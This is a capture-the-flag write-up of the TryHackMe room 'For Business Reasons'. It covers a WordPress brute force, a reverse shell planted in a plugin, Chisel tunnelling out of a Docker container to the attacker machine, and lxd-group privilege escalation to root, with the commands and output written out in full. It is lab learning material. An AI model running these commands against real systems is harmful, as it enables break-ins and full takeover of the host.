I"ì <p><br /></p>

<blockquote>
  <p>A log of how I did the TryHackMe room For Business Reasons by MsMouse</p>
</blockquote>

<p><br /></p>

<h1 id="for-business-reasons">For Business Reasons</h1>
<h2 id="wordpress-login-bruteforce--plugin-reverse-shell">Wordpress Login Bruteforce &amp; Plugin Reverse Shell</h2>
<p>Scanned and received responses from the following ports: 22, 80, 2377, 7946. Only port 80 registered as open.</p>

<p>Found a Wordpress blog and noticed that the default/template posts were made by a user named <code class="language-plaintext highlighter-rouge">sysadmin.</code> So, I chucked a <code class="language-plaintext highlighter-rouge">rockyou.txt</code> bruteforce against that username while I further enumerated the site.</p>

<p>Soon after, I landed a valid password.</p>

<p>I chucked a <code class="language-plaintext highlighter-rouge">rockyou.txt</code> bruteforce against the username <code class="language-plaintext highlighter-rouge">sysadmin</code> while I researched that vulnerability and landed a valid password.</p>

<p>Edited an existing plugin to include a PHP reverse shell and enabled the plugin; got a shell as <code class="language-plaintext highlighter-rouge">www-data</code> in a Docker container.</p>

<h2 id="proxying-through-docker-container">Proxying Through Docker Container</h2>
<p>The Docker container I landed in was lacking a lot core networking utils like <code class="language-plaintext highlighter-rouge">ping</code>, <code class="language-plaintext highlighter-rouge">ip</code>, <code class="language-plaintext highlighter-rouge">ifconfig</code>, etc. After poking around for a while I stumbled upon <a href="https://staaldraad.github.io/2017/12/20/netstat-without-netstat/">this</a> fantastic blog post by <a href="https://staaldraad.github.io/">Staaldraad</a>. In it they detail some research into parsing data from the <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> pseudofile to recreate the <code class="language-plaintext highlighter-rouge">netstat</code> and <code class="language-plaintext highlighter-rouge">id</code> commands.</p>

<p>I use their <code class="language-plaintext highlighter-rouge">awk</code> script:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre><span class="nb">awk</span> <span class="s1">'function hextodec(str,ret,n,i,k,c){
    ret = 0
    n = length(str)
    for (i = 1; i &lt;= n; i++) {
        c = tolower(substr(str, i, 1))
        k = index("123456789abcdef", c)
        ret = ret * 16 + k
    }
    return ret
}
function getIP(str,ret){
    ret=hextodec(substr(str,index(str,":")-2,2)); 
    for (i=5; i&gt;0; i-=2) {
        ret = ret"."hextodec(substr(str,i,2))
    }
    ret = ret":"hextodec(substr(str,index(str,":")+1,4))
    return ret
} 
NR &gt; 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}'</span> /proc/net/tcp
</pre></td></tr></tbody></table></code></pre></figure>

<p>to see the current open TCP connections.</p>

<p><img src="/assets/media/forbusinessreasons/proc_net_tcp_netstat.png" alt="Screenshot of aforementioned awk script and output." /></p>

<p>I noticed a connection between <code class="language-plaintext highlighter-rouge">172.18.0.3</code> and <code class="language-plaintext highlighter-rouge">10.13.1.225</code>. Since the latter is my attack machineâ€™s IP address I conclude that the former IP address belongs to the container that Iâ€™m in. From there I correctly assume that the gateway address of that subnet, <code class="language-plaintext highlighter-rouge">172.18.0.1</code>, belongs to the machine hosting the Docker container; I use the following to scan for certain ports on that address.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-m</span> 1 <span class="nt">--include</span> <span class="nt">-v</span> localhost:<span class="nv">$x</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-m 1</code> Setting a max timeout time for the curl attempt, prevents me from getting stuck on an unresponsive port, which would require me to <code class="language-plaintext highlighter-rouge">ctrl+c</code> and thusly break my non-pty shell.</li>
</ul>

<p>After identifying an open port 22 on the host machine, I download <a href="https://github.com/jpillora/chisel">Chisel</a> onto the docker container and launch the client command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nv">$ </span>./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
2021/09/13 21:34:59 client: Connecting to ws://10.13.1.225:1234
2021/09/13 21:35:00 client: Connected <span class="o">(</span>Latency 184.290108ms<span class="o">)</span>
</code></pre></div></div>

<p>And on my attacker machine, the server command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[/opt/chisel/binaries]
â””â”€<span class="nv">$ </span>./chisel_1.7.6_linux_amd64 server <span class="nt">-p</span> 1234 <span class="nt">--reverse</span>

2021/09/13 16:32:53 server: Reverse tunnelling enabled
2021/09/13 16:32:53 server: Fingerprint gOtbf9dlNJ2ecdo44g20iAMt+SSp8NkeAfp5CWKusaU<span class="o">=</span>
2021/09/13 16:32:53 server: Listening on http://0.0.0.0:1234
</code></pre></div></div>

<p>Iâ€™m then able to ssh against my local machine and have my request proxied through to the victim host machine. The credentials for <code class="language-plaintext highlighter-rouge">sysadmin</code> are reused from the Wordpress blog.</p>

<h2 id="lxc-privileged-recursive-container-filesystem-privesc">lxc Privileged, Recursive Container Filesystem Privesc</h2>
<p>The privilege escalation technique is simple. My user, <code class="language-plaintext highlighter-rouge">sysadmin</code>, belongs to the <code class="language-plaintext highlighter-rouge">lxd</code> group which by default allows that user to use <code class="language-plaintext highlighter-rouge">lxc</code> to escalate privileges.</p>

<p>I create an <a href="https://hub.docker.com/_/alpine">Alpine</a> container on my attacker machine using <a href="https://github.com/lxc/distrobuilder">Distrobuilder</a> then download the resulting files onto the victim machine.</p>

<p>I then execute the following sequence of commands (Learned from <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">Hacktricks</a>) to create a privileged docker container whose filesystem contains a recursive mount of the host machineâ€™s filesystem. This allows me to enter the docker container as <code class="language-plaintext highlighter-rouge">root</code> and act upon the host filesystem as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc image import lxd.tar.xz rootfs.squashfs <span class="nt">--alias</span> alpine
Image imported with fingerprint: 02aa7f299f733b42a726c44d6505645cf23e67ebcb31fda3ec24e8c2d4c0497b             
sysadmin@ubuntu:~<span class="nv">$ </span>lxc init alpine privesc <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true             
</span>Creating privesc
sysadmin@ubuntu:~<span class="nv">$ </span>lxc config device add privesc host-root disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>Device host-root added to privesc
sysadmin@ubuntu:~<span class="nv">$ </span>lxc start privesc
sysadmin@ubuntu:~<span class="nv">$ </span>lxc <span class="nb">exec </span>privesc /bin/sh
~ <span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>
:ET